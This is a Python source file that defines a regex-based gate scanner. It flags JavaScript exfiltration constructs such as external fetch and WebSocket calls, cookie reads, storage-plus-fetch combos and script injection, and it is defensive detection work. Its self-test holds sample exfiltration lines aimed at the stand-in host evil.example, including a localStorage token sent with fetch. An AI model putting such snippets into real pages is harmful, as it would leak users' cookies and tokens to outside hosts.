"""JS exfiltration defense: data theft smuggled in JavaScript, Simulated.

Detects:
- Network sinks called with http(s)/protocol-relative URLs:
  fetch(, XMLHttpRequest.open(, $.ajax(, navigator.sendBeacon(,
  new WebSocket(, new EventSource(
- document.cookie reads
- localStorage/sessionStorage reads combined with a fetch() call (exfil combo)
- Dynamic script injection via document.createElement('script')

What this IS:
* A gate-layer regex scan over JS text before it is executed or stored.
* Detection only -- it flags suspicious calls and returns matched snippets.

What this IS NOT:
* Not a JS parser or taint tracker -- no AST, no data-flow analysis.
* Not a verdict on intent -- the host decides whether to block or sandbox.
"""

from __future__ import annotations

import ast
import re
from typing import Any

#: Module version.
OUT_DEF_48_VERSION = "out-def-48.v1"

#: Schema pin.
SCHEMA_PIN = "northstar.out-def-48.v1"


class OutDef48Error(Exception):
    """Fail-closed."""


#: Maximum evidence snippet length.
_SNIPPET_LEN = 80

_EXT = r"(?:https?:|//)"

#: (label, pattern) pairs. Each sink must pair with an external URL.
_JS_PATTERNS: list = [
    (
        "fetch() with external URL",
        re.compile(r"\bfetch\s*\(\s*['\"]\s*" + _EXT),
    ),
    (
        "XMLHttpRequest.open() with external URL",
        re.compile(
            r"\bXMLHttpRequest\b[\s\S]{0,300}?\.open\s*\([^)]*" + _EXT
        ),
    ),
    (
        "$.ajax() with external URL",
        re.compile(
            r"\$\.ajax\s*\([\s\S]{0,400}?url\s*:\s*['\"]\s*" + _EXT
        ),
    ),
    (
        "navigator.sendBeacon() with external URL",
        re.compile(r"\bnavigator\.sendBeacon\s*\(\s*['\"]\s*" + _EXT),
    ),
    (
        "new WebSocket() with external URL",
        re.compile(r"\bnew\s+WebSocket\s*\(\s*['\"]\s*(?:wss?:|" + _EXT[4:]),
    ),
    (
        "new EventSource() with external URL",
        re.compile(r"\bnew\s+EventSource\s*\(\s*['\"]\s*" + _EXT),
    ),
    (
        "document.cookie read",
        re.compile(r"\bdocument\.cookie\b"),
    ),
    (
        "dynamic script injection",
        re.compile(r"\bdocument\.createElement\s*\(\s*['\"]script['\"]"),
    ),
]

_STORAGE_GET_RE = re.compile(r"\b(?:localStorage|sessionStorage)\.(?:getItem|key)\b")
_FETCH_CALL_RE = re.compile(r"\bfetch\s*\(")


def _storage_exfil_combo(js: str) -> str | None:
    """Flag storage reads combined with a fetch() call (approximate exfil)."""
    m1 = _STORAGE_GET_RE.search(js)
    m2 = _FETCH_CALL_RE.search(js)
    if m1 and m2:
        return f"storage read '{m1.group(0)}' combined with fetch() call"
    return None


def detect_js_exfil(js: str) -> tuple[bool, str, list]:
    """Scan JS text for exfil constructs.

    Returns (threat_found, reason, evidence). threat_found=True means exfil
    was detected. Evidence holds matched snippets (truncated to 80 chars).
    Raises OutDef48Error (fail-closed) on malformed input.
    """
    if not isinstance(js, str):
        raise OutDef48Error(f"expected str, got {type(js).__name__}")
    evidence: list = []
    for label, pattern in _JS_PATTERNS:
        for match in pattern.finditer(js):
            evidence.append(
                {"pattern": label, "snippet": match.group(0)[:_SNIPPET_LEN]}
            )
    combo = _storage_exfil_combo(js)
    if combo:
        evidence.append({"pattern": "storage+fetch exfil combo", "snippet": combo[:_SNIPPET_LEN]})
    if evidence:
        return (
            True,
            f"{len(evidence)} suspicious JS construct(s) detected",
            evidence,
        )
    return False, "js clean", []


def stdlib_only() -> bool:
    """AST check: stdlib only."""
    import pathlib

    tree = ast.parse(
        pathlib.Path(__file__).read_text(encoding="utf-8"), filename=__file__
    )
    allowed = {"__future__", "ast", "pathlib", "re", "typing"}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name.split(".")[0] not in allowed:
                    return False
        elif isinstance(node, ast.ImportFrom):
            if node.module and node.module.split(".")[0] not in allowed:
                return False
    return True


def main() -> None:
    """Self-check."""
    # fetch() to external URL.
    found, _, evidence = detect_js_exfil('fetch("https://evil.example/x");')
    assert found is True
    assert evidence[0]["pattern"].startswith("fetch()")

    # XMLHttpRequest.open() to external URL.
    found, _, _ = detect_js_exfil(
        'var r = new XMLHttpRequest(); r.open("GET", "http://evil.example/x");'
    )
    assert found is True

    # $.ajax() with external url.
    found, _, _ = detect_js_exfil('$.ajax({url: "https://evil.example/x"});')
    assert found is True

    # navigator.sendBeacon().
    found, _, _ = detect_js_exfil('navigator.sendBeacon("https://evil.example/x", d);')
    assert found is True

    # new WebSocket().
    found, _, _ = detect_js_exfil('var s = new WebSocket("wss://evil.example/x");')
    assert found is True

    # new EventSource().
    found, _, _ = detect_js_exfil('var e = new EventSource("//evil.example/x");')
    assert found is True

    # document.cookie read.
    found, _, _ = detect_js_exfil("var c = document.cookie;")
    assert found is True

    # Storage read + fetch() combo (relative fetch URL still counts).
    found, _, evidence = detect_js_exfil(
        'var t = localStorage.getItem("tok"); fetch("/api/local", {body: t});'
    )
    assert found is True
    assert any(e["pattern"] == "storage+fetch exfil combo" for e in evidence)

    # Dynamic script injection.
    found, _, _ = detect_js_exfil(
        "var s = document.createElement('script'); s.src = u;"
    )
    assert found is True

    # Clean JS passes, including a relative-URL fetch.
    found, reason, _ = detect_js_exfil(
        "function add(a, b) { return a + b; }\n"
        'console.log(add(2, 3));\n'
        'fetch("/api/local").then(r => r.json());'
    )
    assert found is False, reason

    # Fail-closed on malformed input.
    try:
        detect_js_exfil(None)  # type: ignore[arg-type]
    except OutDef48Error:
        pass
    else:
        raise AssertionError("expected OutDef48Error")

    assert stdlib_only()
    print("out-def-48 OK: sinks, cookie, storage combo, script injection, stdlib")


if __name__ == "__main__":
    main()
